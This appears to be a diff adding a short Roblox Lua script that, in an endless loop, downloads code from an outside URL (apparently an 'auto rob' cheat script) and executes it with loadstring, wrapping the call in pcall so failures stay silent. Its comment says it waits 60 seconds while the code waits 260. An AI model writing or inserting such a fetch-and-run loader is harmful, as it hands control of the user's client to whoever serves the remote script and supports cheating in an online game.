@@ -1,0 +1,8 @@
+while true do
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://techhub.group/scripts/nexarehautorob"))()
+        end)
+    end)
+    task.wait(260) -- Ждет 60 секунд перед следующим выполнением
+end
